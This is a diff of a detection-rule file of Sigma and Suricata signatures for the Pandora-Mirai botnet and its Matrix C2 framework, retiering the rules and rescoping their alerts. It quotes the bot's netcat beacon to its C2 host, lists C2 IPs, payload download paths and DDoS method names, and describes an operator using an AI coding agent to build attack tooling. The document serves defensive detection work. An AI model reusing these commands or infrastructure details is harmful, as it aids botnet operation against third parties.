-**Rationale:** `PandoraNet` is the operator-bespoke botnet ID suffixed by architecture tag (e.g., `pandora_bot PandoraNet.arm7`). Not observed on any other host in Hunt.io 365-day index. Its presence in process command line or environment variables is a direct active-infection indicator.
-**ATT&CK Coverage:** T1095 (Non-Application Layer Protocol), T1059.004 (Unix Shell)
+**Tier:** Detection
+**Robustness:** 2
+**ATT&CK Coverage:** T1059.004 (Unix Shell), T1095 (Non-Application Layer Protocol)
 **Confidence:** HIGH
-**False Positive Risk:** LOW — `PandoraNet` is operator-specific and not found in any legitimate software; any process executing with this argument is the Pandora-Mirai bot active on the host
+**Rationale:** `/bin/busybox SORA` is not a valid busybox applet invocation and has no legitimate use — it is a Sora-lineage self-identification marker used by this operator's Naku/Pandora build and by other Sora-derivative Mirai forks generally, making it a tool-family artifact rather than a single-build literal (an operator would need to recompile from a divergent source tree to remove it, which most downstream Sora-lineage adopters do not do). Unchanged from the original file.
+**False Positives:** Unlikely — `/bin/busybox SORA` is not a valid busybox applet call and has no legitimate use.
+**Blind Spots:** A Sora-lineage fork that has genuinely renamed this self-identification string would evade; scoped to `product: linux` process_creation telemetry.
+**Validation:** Execute a Sora-derivative Mirai bot's competitor-kill/process-enumeration routine — must match; legitimate busybox invocations with any other applet argument must NOT fire.
+**Deployment:** EDR/Sysmon-equivalent process-creation telemetry on Linux hosts.
+
+```yaml
+title: BusyBox SORA Marker Execution — Sora-Derivative Mirai-Fork Active on Host
+id: 625a0af0-2c6e-48b5-89ea-0c7e6b191147
+status: experimental
+description: >-
+  Detects execution of the '/bin/busybox SORA' command, which is the Sora-fork Mirai-derivative lineage signature. Decoded from XOR-0x54 region in all 11 Naku/Pandora-Mirai architectures (UTA-2026-014), replacing stock Mirai's '/bin/busybox MIRAI'. The Mirai bot calls this as part of its process enumeration and competitor-kill routine. Any process executing '/bin/busybox SORA' indicates active Sora-derivative bot execution on the host.
+references:
+    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
+author: The Hunters Ledger
+date: '2026-05-26'
+tags:
+    - attack.execution
+    - attack.t1059.004
+    - attack.command-and-control
+    - attack.t1095
+    - detection.emerging-threats
+logsource:
+    category: process_creation
+    product: linux
+detection:
+    selection:
+        CommandLine|contains: '/bin/busybox SORA'
+    condition: selection
+falsepositives:
+    - Unlikely — '/bin/busybox SORA' is not a valid busybox applet call and has no legitimate use
+level: high
+```
+
+### Hunting Rules
+
+**Pandora-Mirai (Naku ELF Bot Suite)**
+
+#### PandoraNet Botnet ID in Process Command Line — Active Pandora-Mirai Infection
+
+**Tier:** Hunting
+**Robustness:** 1
+**ATT&CK Coverage:** T1095 (Non-Application Layer Protocol), T1059.004 (Unix Shell)
+**Confidence:** HIGH for the artifact; retiered on durability
+**Rationale:** `PandoraNet` is a single operator-chosen botnet-ID literal — durable against accidental FP today (not observed on any other host in Hunt.io's 365-day index) but trivially evaded by a rename in a future build (Gate 1: mutex/ID-class single literal → Robustness 1). The original `level: critical` was inflated for a single-selector rule with no combination logic; demoted to `medium` per level-discipline (Gate 4) and retiered to Hunting.
+**False Positives:** Unlikely — `PandoraNet` is an operator-bespoke botnet identifier not used by any known legitimate software, but the rule provides no value once the operator renames the string.
+**Deployment:** EDR/Sysmon-equivalent process-creation telemetry; treat a hit as a high-confidence active-infection lead requiring rapid triage rather than an auto-actioned alert.
 
 ```yaml
 title: PandoraNet Botnet ID in Process Command Line — Active Pandora-Mirai Infection
 id: 481ee321-8631-4a9d-b1b6-87e8a5676690
 status: experimental
 description: >-
-  Detects the PandoraNet operator-bespoke botnet ID string in process command line arguments, indicating active execution of the Pandora-Mirai IoT botnet (UTA-2026-014). The format is 'pandora_bot PandoraNet.{arch}' where arch is one of 11 IoT CPU architectures. This string is not observed in any other host in threat intelligence indexing and indicates active bot process on the monitored system.
+  Detects the PandoraNet operator-bespoke botnet ID string in process command line arguments, indicating active execution of the Pandora-Mirai IoT botnet (UTA-2026-014). The format is 'pandora_bot PandoraNet.{arch}' where arch is one of 11 IoT CPU architectures. This string is not observed in any other host in threat intelligence indexing and indicates active bot process on the monitored system, but is a single renameable literal — treat as a hunting lead, not an auto-actioned detection.
 references:
     - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
 author: The Hunters Ledger
@@ -793,25 +805,25 @@ detection:
     condition: selection
 falsepositives:
     - Unlikely — PandoraNet is an operator-bespoke botnet identifier not used by any known legitimate software
-level: critical
+level: medium
 ```
 
----
+#### Non-Watchdog Process Opening /dev/watchdog — Mirai-Canonical Persistence Tactic
 
-### Sigma Rule 5 — /dev/watchdog Access by Non-Watchdog Process
-
-**Detection Priority:** MEDIUM
-**Rationale:** Mirai-canonical persistence tactic: bot opens `/dev/watchdog` and runs ioctl WDIOC_KEEPALIVE in a loop to prevent IoT device from rebooting, keeping the infection persistent. On server hosts (vs true IoT devices), this is highly anomalous — only kernel watchdog daemons legitimately interact with `/dev/watchdog`.
+**Tier:** Hunting
+**Robustness:** 3
 **ATT&CK Coverage:** T1014 (Rootkit), T1053.003 (Cron)
 **Confidence:** HIGH
-**False Positive Risk:** LOW on server hosts; MEDIUM on IoT-class devices where watchdog daemons are more common
+**Rationale:** A fully behavioral, zero-literal technique signal — a technique chokepoint by Gate 1's own definition (highest durability tier). Retained at Hunting rather than promoted to Detection: the honest false-positive assessment is genuinely mixed across deployment context (LOW on server hosts, MEDIUM on IoT-class devices with legitimate custom watchdog daemons the 3-name `filter_legit` list cannot exhaustively cover), and the rule's own `level: medium` reflects that — per level-discipline, a rule that honestly sits at medium belongs in Hunting. Unchanged detection logic.
+**False Positives:** Embedded system watchdog management tools on IoT/embedded Linux — tune `filter_legit` for your environment; custom watchdog wrapper scripts in industrial control environments; hardware monitoring agents on servers with watchdog hardware support.
+**Deployment:** EDR/Sysmon-equivalent process-creation telemetry; highest-confidence on server-class hosts where the FP scenarios above are least likely.
 
 ```yaml
 title: Non-Watchdog Process Opening /dev/watchdog — Mirai-Canonical Persistence Tactic
 id: 716bce61-4dcb-4479-b815-1391f5c7cd43
 status: experimental
 description: >-
-  Detects processes other than known watchdog daemons (watchdogd, systemd-watchdog) opening /dev/watchdog or /dev/misc/watchdog. This is a canonical Mirai botnet persistence mechanism — the bot opens the watchdog device and continuously pets it (ioctl WDIOC_KEEPALIVE) to prevent IoT device auto-reboot, keeping the infection persistent across watchdog-triggered reset cycles. Observed in Naku.arm (Pandora-Mirai family, UTA-2026-014) and generic to all Mirai/Sora derivative bots.
+  Detects processes other than known watchdog daemons (watchdogd, systemd-watchdog) opening /dev/watchdog or /dev/misc/watchdog. This is a canonical Mirai botnet persistence mechanism — the bot opens the watchdog device and continuously pets it (ioctl WDIOC_KEEPALIVE) to prevent IoT device auto-reboot, keeping the infection persistent across watchdog-triggered reset cycles. Observed in Naku.arm (Pandora-Mirai family, UTA-2026-014) and generic to all Mirai/Sora derivative bots. FP profile varies by deployment context (low on servers, higher on IoT/embedded hosts) — deploy as a hunting lead.
 references:
     - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
 author: The Hunters Ledger
@@ -845,103 +857,62 @@ falsepositives:
 level: medium
 ```
 
----
+#### Naku/Pandora-Mirai Operator-Bespoke 22-Char Charset String — Family Tracking Signature
 
-### Matrix C2 Python Framework
-
----
-
-### Sigma Rule 6 — Outbound TCP/1337 to Matrix C2 Operator Infrastructure
-
-**Detection Priority:** HIGH
-**Rationale:** TCP/1337 outbound to `87.106.143.220` is the Matrix C2 JSON-over-TCP C2 channel used by `persistent_bot.sh` (bot_register + heartbeat messages) and `mirai_clone.py` (pipe-delimited infection reports). Port 1337 outbound from server hosts to this specific IP is a direct active C2 communication indicator.
-**ATT&CK Coverage:** T1071.001 (Web Protocols), T1095 (Non-Application Layer Protocol)
-**Confidence:** HIGH
-**False Positive Risk:** LOW — TCP/1337 is non-standard; combined with the specific operator IP, FP risk is near-zero
+**Tier:** Hunting
+**Robustness:** 1
+**ATT&CK Coverage:** T1027 (Obfuscated Files or Information), T1095 (Non-Application Layer Protocol)
+**Confidence:** HIGH for the artifact; narrow applicability
+**Rationale:** The 22-char charset is a single-build random-string constant (Gate 1: mutex/charset-class single literal → Robustness 1) — a future build regenerating the charset evades entirely. It is also questionable whether this internally-used obfuscation constant would ever literally surface in a process `CommandLine` (as opposed to binary content, which the companion YARA rule already covers); this Sigma rule has narrower practical hit-rate than its YARA counterpart. Demoted level from `high` to `medium` and retiered to Hunting.
+**False Positives:** Unlikely — this specific character set in this order is operator-bespoke and not found in any other host in Hunt.io's 365-day index; near-zero probability of accidental match. Practical yield may be low if the string never appears in a literal command line.
+**Deployment:** EDR/Sysmon-equivalent process-creation telemetry with full command-line capture; the companion YARA rule (`MAL_ELF_Naku_Pandora_Mirai_Family`) is the primary detection surface for this indicator.
 
 ```yaml
-title: Outbound TCP/1337 to Matrix C2 Operator Infrastructure — Active Bot C2 Channel
-id: 23ab4d7b-192d-44ad-bad0-3e5d19514007
+title: Naku/Pandora-Mirai Operator-Bespoke 22-Char Charset String — Family Tracking Signature
+id: c9d201aa-2fbb-4e1e-b269-76cf28670998
 status: experimental
 description: >-
-  Detects outbound TCP connections to port 1337 at 87.106.143.220 (1&1 IONOS DE VPS), the Matrix C2 JSON-over-TCP command-and-control channel used by the Pandora-Mirai operator (UTA-2026-014). The bot_register and heartbeat messages use netcat (nc -w 5 87.106.143.220 1337) with JSON payloads. Port 1337 is non-standard for legitimate server egress; connections to this specific IP indicate active bot C2 or infection-report traffic.
+  Detects the operator-bespoke 22-character random-string charset '1gba4cdom53nhp12ei0kfj' in process command lines. This string is present in all 11 architectures of the Naku/Pandora-Mirai ELF botnet (UTA-2026-014) — both XOR-0x54 encoded in stripped production builds and in plaintext in the arm7 debug build. It is not observed in any other host in threat intelligence indexing, but is a single-build constant that a future release would regenerate, and its practical appearance in a literal process command line (versus binary content) is unconfirmed — treat as a hunting lead; the companion YARA rule is the primary detection surface.
 references:
     - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
 author: The Hunters Ledger
 date: '2026-05-26'
 tags:
+    - attack.stealth
+    - attack.t1027
     - attack.command-and-control
-    - attack.t1071.001
     - attack.t1095
     - detection.emerging-threats
 logsource:
-    category: network_connection
+    category: process_creation
     product: linux
 detection:
     selection:
-        DestinationIp: '87.106.143.220'
-        DestinationPort: 1337
+        CommandLine|contains: '1gba4cdom53nhp12ei0kfj'
     condition: selection
 falsepositives:
-    - No legitimate use case for TCP/1337 connections to this specific IP from server hosts
-level: high
+    - Unlikely — this string is operator-bespoke and not used in any known legitimate software
+level: medium
 ```
 
----
+**Matrix C2 Framework**
 
-### Sigma Rule 7 — Outbound TCP/23 to Parasitic CNC on GetYourGroup Tourism VPS
+#### Discord Bot API Egress with Attack-Method Dispatch Payload from Server Host
 
-**Detection Priority:** HIGH
-**Rationale:** Outbound TCP/23 (Telnet) to `165.227.175.161` is the Naku/Pandora ELF bot's CNC connection — hardcoded inline in main() as a raw 32-bit constant. This IP is a compromised production tourism VPS (auvergne-rhone-alpes-for-groups.com). Any IoT device or server making an outbound TCP/23 connection to this IP is an active Naku bot connecting to its CNC.
-**ATT&CK Coverage:** T1095 (Non-Application Layer Protocol), T1071.001 (Web Protocols)
-**Confidence:** HIGH
-**False Positive Risk:** LOW — TCP/23 outbound connections from server/IoT hosts are rare; this specific destination IP makes it specific to active Naku infection
-
-```yaml
-title: Outbound TCP/23 to Naku-Pandora CNC — Active Bot Connecting to Compromised Tourism VPS
-id: c9d77df7-5af0-4863-afea-ca13e6ccd3ce
-status: experimental
-description: >-
-  Detects outbound TCP connections to port 23 at 165.227.175.161 (DigitalOcean DO allocation — compromised GetYourGroup tourism VPS auvergne-rhone-alpes-for-groups.com). This is the hardcoded CNC endpoint for the Naku/Pandora-Mirai 11-architecture IoT botnet (UTA-2026-014), extracted via ARM ELF disassembly of Naku.arm (raw 32-bit constant 0xa1afe3a5 = 165.227.175.161, port 0x0017 = 23). CNC daemon planted on TCP/23 on a legitimate French tourism business VPS — parasitic hosting for OPSEC separation from operator-owned infrastructure.
-references:
-    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
-author: The Hunters Ledger
-date: '2026-05-26'
-tags:
-    - attack.command-and-control
-    - attack.t1095
-    - attack.t1071.001
-    - detection.emerging-threats
-logsource:
-    category: network_connection
-    product: linux
-detection:
-    selection:
-        DestinationIp: '165.227.175.161'
-        DestinationPort: 23
-        Initiated: 'true'
-    condition: selection
-falsepositives:
-    - No legitimate use case for Telnet connections to this specific IP
-level: high
-```
-
----
-
-### Sigma Rule 8 — Discord-Bot Attack-Method Dispatch from Non-Developer Host
-
-**Detection Priority:** MEDIUM
-**Rationale:** Discord API egress from server hosts is anomalous in most environments. The Matrix C2 Discord bot dispatches DDoS attacks via the Discord API from the operator's server, not a user workstation. Any non-developer host making Discord API connections with attack-method dispatch patterns in the request body is a high-confidence indicator of DDoS-as-a-Service customer interface activity.
+**Tier:** Hunting
+**Robustness:** 2
 **ATT&CK Coverage:** T1059.007 (JavaScript), T1498.001 (Direct Network Flood)
-**Confidence:** MODERATE — detecting request body content requires proxy/HTTPS-interception capability
-**False Positive Risk:** MEDIUM — Discord egress from servers (bot hosting) is legitimate in developer/SaaS environments; rule requires process context to disambiguate
+**Confidence:** MODERATE
+**Rationale:** `discord.com` is a stable, non-operator-controlled domain (durable — Discord will not relocate it), but this is fundamentally a "legitimate SaaS egress from an unusual host class" anomaly rule: Discord bot hosting on servers is common in legitimate developer/SaaS environments, and the original author explicitly notes MEDIUM FP risk requiring process context to disambiguate. Unchanged detection logic.
+**False Positives:** Legitimate Discord bots hosted on server infrastructure — all Discord bot deployments on production servers; SaaS applications integrating Discord notifications; developer environments testing Discord integrations.
+**Deployment:** Network/EDR telemetry correlating egress with process context; requires tuning `filter_known_dev` to your environment's legitimate Discord bot inventory before triage.
 
 ```yaml
 title: Discord Bot API Egress with Attack-Method Dispatch Payload from Server Host
 id: 7e3175bc-9a74-4c93-b358-de78d84250f4
 status: experimental
 description: >-
-  Detects Discord API (discord.com/api/v9/) egress traffic from non-developer server hosts, indicative of the Matrix C2 DDoS-as-a-Service Discord-bot customer interface (UTA-2026-014). The Discord bot dispatches DDoS attack commands on behalf of paying customers via a JavaScript bot running on the operator's IONOS VPS. Discord bot traffic from production server hosts in non-developer environments is anomalous and warrants investigation. Higher-confidence detection requires proxy logs with content inspection to identify attack-method dispatch patterns (ovh-nuke, syn-storm, frag-storm keywords in message content).
+  Detects Discord API (discord.com/api/v9/) egress traffic from non-developer server hosts, indicative of the Matrix C2 DDoS-as-a-Service Discord-bot customer interface (UTA-2026-014). The Discord bot dispatches DDoS attack commands on behalf of paying customers via a JavaScript bot running on the operator's VPS. Discord bot traffic from production server hosts in non-developer environments is anomalous and warrants investigation, but Discord bot hosting is also a common legitimate pattern — treat as a hunting lead requiring process-context correlation, not a standalone alert.
 references:
     - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
 author: The Hunters Ledger
@@ -973,26 +944,24 @@ falsepositives:
 level: medium
 ```
 
----
+**Rovodev Operator Artifacts**
 
-### Operator OPSEC Artifacts (Rovodev)
+#### Rovodev AI Agent Sessions Directory Creation on Server Host — Potential AI-Augmented Offensive Operations
 
----
-
-### Sigma Rule 9 — Rovodev Sessions Directory Creation on Server Host
-
-**Detection Priority:** MEDIUM
-**Rationale:** `~/.rovodev/sessions/` directory creation on a server host indicates the Atlassian Rovodev AI coding agent is or was running on that system. Combined with `session_context.json` large file creation (1.24 MB primary session), this indicates an operator using Rovodev for server-side development — which in this case was offensive framework development. On server hosts (not developer workstations), Rovodev session directory creation is anomalous.
+**Tier:** Hunting
+**Robustness:** 2
 **ATT&CK Coverage:** T1587.001 (Develop Capabilities: Malware)
-**Confidence:** MODERATE — Rovodev may legitimately run on some server hosts for DevOps automation; context-dependent
-**False Positive Risk:** MEDIUM — Rovodev is a legitimate enterprise product; this rule targets anomalous use on server hosts specifically
+**Confidence:** MODERATE
+**Rationale:** Detects the mere presence of a legitimate Atlassian Rovodev AI agent session on a server host, with no malicious-content qualifier in the detection logic — Rovodev is a legitimate enterprise product, and the original author explicitly notes MEDIUM FP risk (DevOps automation use is real). This is a scoping/inventory lead ("who is running Rovodev on server infrastructure"), not an alerting-grade signal. Unchanged detection logic.
+**False Positives:** Legitimate DevOps teams using Rovodev on server hosts for infrastructure automation; CI/CD pipeline hosts running Rovodev for code generation tasks; developer workstations (this rule is most useful on production server hosts; tune to exclude known developer environments).
+**Deployment:** EDR/Sysmon-equivalent file-creation telemetry; pair a hit with content inspection of the session artifact before escalation.
 
 ```yaml
 title: Rovodev AI Agent Sessions Directory Creation on Server Host — Potential AI-Augmented Offensive Operations
 id: 273f8eea-72b3-48c7-a134-cdc5a65064d7
 status: experimental
 description: >-
-  Detects creation of Atlassian Rovodev AI coding agent session artifacts (~/.rovodev/sessions/ directory, session_context.json files exceeding 100KB) on server hosts. In the UTA-2026-014 case, the operator used Rovodev on their IONOS VPS to author a complete offensive framework (Matrix C2). Rovodev session directories on production server hosts outside of known DevOps pipelines warrant investigation, particularly when co-located with /root/matrix/ or similar offensive framework paths.
+  Detects creation of Atlassian Rovodev AI coding agent session artifacts (~/.rovodev/sessions/ directory, session_context.json files exceeding 100KB) on server hosts. In the UTA-2026-014 case, the operator used Rovodev on their VPS to author a complete offensive framework (Matrix C2). Rovodev session directories on production server hosts outside of known DevOps pipelines warrant investigation, particularly when co-located with an offensive-framework-looking working directory, but Rovodev is a legitimate enterprise product — treat as a scoping/inventory lead.
 references:
     - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
 author: The Hunters Ledger
@@ -1017,22 +986,22 @@ falsepositives:
 level: medium
 ```
 
----
+#### Rovodev Log File_Write Tool-Call Pattern — AI-Augmented Offensive Operations Evidence
 
-### Sigma Rule 10 — Rovodev Log File_Write Tool-Call Pattern
-
-**Detection Priority:** MEDIUM
-**Rationale:** The `rovodev.log` file (8.5 MB) captures the runtime CLI including `file_write` tool calls containing offensive content. Detection of log files with `file_write` tool-call patterns in combination with offensive Python content (`#!/usr/bin/env python3` in `initial_content`) is specific to AI-augmented offensive operations workflow. Useful for hunting exposed operator infrastructure.
+**Tier:** Hunting
+**Robustness:** 1
 **ATT&CK Coverage:** T1587.001 (Develop Capabilities: Malware)
-**Confidence:** MODERATE — requires log content inspection capability
-**False Positive Risk:** LOW for `file_write` + offensive Python content co-occurrence in Rovodev logs; MEDIUM for `file_write` alone
+**Confidence:** MODERATE
+**Rationale:** Fires on the mere presence of `rovodev.log` — every Rovodev installation generates this file, malicious or benign, so the rule has essentially zero standalone discriminating power. Retained as a Hunting-tier scoping lead (inventorying every host running Rovodev is a legitimate step when hunting for AI-agent-assisted offensive activity in this investigation), consistent with the original author's already-honest `level: low`. Unchanged detection logic.
+**False Positives:** All Rovodev installations generate rovodev.log — this rule fires on any host running Rovodev; tune to server hosts outside known DevOps pipelines; CI/CD pipeline hosts running Rovodev legitimately.
+**Deployment:** EDR/Sysmon-equivalent file-creation telemetry; use strictly as a starting point for subsequent log-content inspection, never as a standalone alert.
 
 ```yaml
-title: Rovodev Log File_Write Tool-Call with Offensive Content — AI-Augmented Offensive Operations Evidence
+title: Rovodev Log File_Write Tool-Call Pattern — AI-Augmented Offensive Operations Evidence
 id: 817e5ca2-7265-41b3-b344-bbf36afc3193
 status: experimental
 description: >-
-  Detects Atlassian Rovodev AI coding agent runtime log (rovodev.log) containing file_write tool-call patterns with Python shebang initial_content, indicating the AI agent authored Python files during the session. In the UTA-2026-014 case, the 8.5 MB rovodev.log captured file_write calls producing attack_engine.py, master_control.py, stealth_agent.py, and the Discord bot JavaScript dispatch table. Content inspection of Rovodev logs for offensive capability markers can identify AI-augmented offensive operations in progress or recently completed.
+  Detects creation of the Atlassian Rovodev AI coding agent runtime log (rovodev.log). In the UTA-2026-014 case, the 8.5 MB rovodev.log captured file_write calls producing attack_engine.py, master_control.py, stealth_agent.py, and the Discord bot JavaScript dispatch table. Every Rovodev installation generates this file regardless of intent — use strictly as a scoping starting point for subsequent content inspection of the log for offensive capability markers, not as a standalone alert.
 references:
     - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
 author: The Hunters Ledger
@@ -1056,272 +1025,190 @@ level: low
 
 ---
 
-### Sigma Rule 11 — 22-Char Bespoke Charset in File or Process Memory
-
-**Detection Priority:** MEDIUM
-**Rationale:** The string `1gba4cdom53nhp12ei0kfj` is the operator-bespoke 22-character random-string charset confirmed in all 11 Naku/Pandora ELF architectures (XOR-0x54 encoded in production builds, plaintext in arm7 debug build). Its presence in any file or process memory is a direct tracking signature for this operator's Mirai-fork lineage.
-**ATT&CK Coverage:** T1027 (Obfuscated Files or Information), T1095 (Non-Application Layer Protocol)
-**Confidence:** HIGH
-**False Positive Risk:** LOW — this specific character set in this order is operator-bespoke; not found in any other host in Hunt 365-day index; near-zero probability of accidental match
-
-```yaml
-title: Naku/Pandora-Mirai Operator-Bespoke 22-Char Charset String — Family Tracking Signature
-id: c9d201aa-2fbb-4e1e-b269-76cf28670998
-status: experimental
-description: >-
-  Detects the operator-bespoke 22-character random-string charset '1gba4cdom53nhp12ei0kfj' in file content or process command lines. This string is present in all 11 architectures of the Naku/Pandora-Mirai ELF botnet (UTA-2026-014) — both XOR-0x54 encoded in stripped production builds and in plaintext in the arm7 debug build. It is not observed in any other host in threat intelligence indexing and constitutes a cross-architecture operator tracking signature. Detection in any context indicates Pandora-Mirai family presence.
-references:
-    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
-author: The Hunters Ledger
-date: '2026-05-26'
-tags:
-    - attack.stealth
-    - attack.t1027
-    - attack.command-and-control
-    - attack.t1095
-    - detection.emerging-threats
-logsource:
-    category: process_creation
-    product: linux
-detection:
-    selection:
-        CommandLine|contains: '1gba4cdom53nhp12ei0kfj'
-    condition: selection
-falsepositives:
-    - Unlikely — this string is operator-bespoke and not used in any known legitimate software
-level: high
-```
-
----
-
-### Sigma Rule 12 — busybox SORA Marker in ELF Binary on Server Hosts
-
-**Detection Priority:** MEDIUM
-**Rationale:** `/bin/busybox SORA` (XOR-0x54 decoded from Naku ELF binaries) is the Sora-fork derivative signature — replaces stock Mirai's `/bin/busybox MIRAI` token. Its presence as a command executed by a process on a server or IoT host indicates a Sora-derivative Mirai bot is executing. The Sora lineage includes this operator's Naku/Pandora family, other Sora forks, and variants.
-**ATT&CK Coverage:** T1059.004 (Unix Shell), T1095 (Non-Application Layer Protocol)
-**Confidence:** HIGH — this is a Sora-derivative-specific fork marker confirmed in Naku arm7 debug symbols and XOR-decoded from all 11 production builds
-**False Positive Risk:** LOW on server hosts; busybox SORA is not a legitimate busybox parameter
-
-```yaml
-title: BusyBox SORA Marker Execution — Sora-Derivative Mirai-Fork Active on Host
-id: 625a0af0-2c6e-48b5-89ea-0c7e6b191147
-status: experimental
-description: >-
-  Detects execution of the '/bin/busybox SORA' command, which is the Sora-fork Mirai-derivative lineage signature. Decoded from XOR-0x54 region in all 11 Naku/Pandora-Mirai architectures (UTA-2026-014), replacing stock Mirai's '/bin/busybox MIRAI'. The Mirai bot calls this as part of its process enumeration and competitor-kill routine. Any process executing '/bin/busybox SORA' indicates active Sora-derivative bot execution on the host.
-references:
-    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
-author: The Hunters Ledger
-date: '2026-05-26'
-tags:
-    - attack.execution
-    - attack.t1059.004
-    - attack.command-and-control
-    - attack.t1095
-    - detection.emerging-threats
-logsource:
-    category: process_creation
-    product: linux
-detection:
-    selection:
-        CommandLine|contains: '/bin/busybox SORA'
-    condition: selection
-falsepositives:
-    - Unlikely — '/bin/busybox SORA' is not a valid busybox applet call and has no legitimate use
-level: high
-```
-
----
-
 ## Suricata Signatures
 
----
+> **Metadata modernization note:** the original file's Suricata rules predate the `suricata-rule-formatting` skill and used a non-standard `metadata:` schema (`affected_product`/`attack_target`/`created_at`/`deployment`/`signature_severity`/`tag`) and a `"THL - "` (hyphenated) `msg` prefix. All rules below are reformatted to the canonical `metadata:author The_Hunters_Ledger, date, reference` schema and the `"THL <CampaignTag> ..."` `msg` convention. `sid` values are preserved unchanged from the original (9001002–9001014) to avoid retiring any existing feed-generator SID mapping; `rev` is bumped to `2` on every rule whose detection logic changed (destination broadened) and left at `1` where logic is unchanged. The withdrawn DNS rule (`sid:9001001`, commented out in the original file since 2026-06-19 for matching all `github.com` DNS lookups) remains withdrawn and is not reproduced here.
 
-**Detection Priority:** HIGH
-**Rationale:** DNS query for github.com/keyosbuff/ pattern catches any operator referencing this (now-deleted) C2 leak repository. Useful for hunting operators referencing the upstream source in DNS or HTTP traffic.
-**ATT&CK Coverage:** T1588.001 (Obtain Capabilities: Malware), T1584.004 (Compromise Infrastructure: Server)
-**Confidence:** MODERATE — DNS query detection requires DNS logging; github.com is CDN-terminated so the URL path is in TLS, not plaintext
-**False Positive Risk:** LOW — `keyosbuff` is the operator's referenced upstream; no known legitimate use of this GitHub handle
+### Detection Rules
 
-```suricata
-# Rule 1 — DNS/HTTP reference to keyosbuff GitHub C2-Leak repository
-# Note: github.com/keyosbuff/C2-Leak is now 404/deleted; DNS query for raw github.com
-# won't surface the path; HTTP URL detection requires TLS inspection or non-HTTPS fetch.
-# This rule catches any DNS resolution of github.com in context where keyosbuff appears
-# in subsequent HTTP traffic (non-TLS) or in server-side log files.
+**Pandora-Mirai (Naku ELF Bot Suite)**
 
-# [WITHDRAWN 2026-06-19] Overbroad — matched ALL github.com DNS lookups (false positive for every subscriber that resolves github.com). Specific Rovodev indicators retained: keyosbuff repo URI rule + IONOS VPS IPs 87.106.143.220 / 87.106.54.213.
-# alert dns $HOME_NET any -> any any (msg:"THL - Rovodev Operator C2-Leak GitHub Reference - DNS Query github.com from Suspicious Context"; dns.query; content:"github.com"; nocase; threshold: type limit, track by_src, count 1, seconds 300; sid:9001001; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Internal, signature_severity Major, tag UTA-2026-014;)
+#### Pandora-Mirai Naku Binary Distribution URI Path
 
-alert http $HOME_NET any -> any any (msg:"THL - Rovodev Operator keyosbuff C2-Leak Repository HTTP Reference - UTA-2026-014"; http.uri; content:"keyosbuff"; nocase; sid:9001002; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Major, tag UTA-2026-014;)
-```
-
----
-
-**Detection Priority:** HIGH
-**Rationale:** HTTP GET requests to `87.106.143.220` or `87.106.54.213` for paths matching Naku or Pandora binary naming patterns (`/bins/Naku.`, `/Pandoras_Box/Pandora.`, `/bot.sh`) indicate active botnet reseeding or initial dropper download. These are operator-owned IONOS VPS hosts; HTTP to these IPs for these paths is a direct distribution-channel indicator.
+**Tier:** Detection
+**Robustness:** 2
 **ATT&CK Coverage:** T1071.001 (Web Protocols), T1587.001 (Develop Capabilities: Malware)
-**Confidence:** HIGH — URLs confirmed byte-verified in Naku binary plaintext exploit payloads
-**False Positive Risk:** LOW — specific IPs + Naku/Pandora path patterns combined leave near-zero FP surface
+**Confidence:** HIGH
+**Rationale:** Salvaged from the original — the rule required the destination to be the operator's specific IONOS IP (`87.106.143.220`), so it would stop firing the moment the operator rotated VPS. Broadened destination to `$EXTERNAL_NET`, keeping the distinctive `/bins/Naku.` URI-path content anchor (a bespoke arch-tagged binary distribution convention, not a generic path). Survives infrastructure rotation while retaining meaningful precision.
+**False Positives:** None known — `/bins/Naku.` as a URI path prefix has no plausible legitimate collision.
+**Blind Spots:** A rebrand that changes the distribution path convention evades; HTTPS-channel fetches are opaque to this rule without TLS interception.
+**Validation:** Replay a PCAP of a Naku binary fetch over this URI convention — must alert; ordinary HTTP traffic to unrelated paths must NOT.
+**Deployment:** Network IDS/IPS at perimeter and internal segmentation points.
 
 ```suricata
-# Rule 2 — HTTP egress to operator IONOS pair fetching Naku/Pandora binaries
-alert http $HOME_NET any -> 87.106.143.220 any (msg:"THL - Pandora-Mirai Binary Distribution Fetch from IONOS Primary - /bins/Naku or /Pandoras_Box/Pandora - UTA-2026-014"; http.uri; content:"/bins/Naku."; startswith; sid:9001003; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)
-
-alert http $HOME_NET any -> 87.106.143.220 any (msg:"THL - Pandora-Mirai bot.sh Reseed Download from IONOS Primary - UTA-2026-014"; http.uri; content:"/bot.sh"; endswith; sid:9001004; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)
-
-alert http $HOME_NET any -> 87.106.143.220 any (msg:"THL - Pandora-Mirai Binary Distribution Fetch /Pandoras_Box - UTA-2026-014"; http.uri; content:"/Pandoras_Box/Pandora."; startswith; sid:9001005; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)
-
-alert http $HOME_NET any -> 87.106.54.213 any (msg:"THL - Pandora-Mirai Binary Distribution Fetch from IONOS Backup VPS - UTA-2026-014"; http.uri; content:"Naku."; sid:9001006; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)
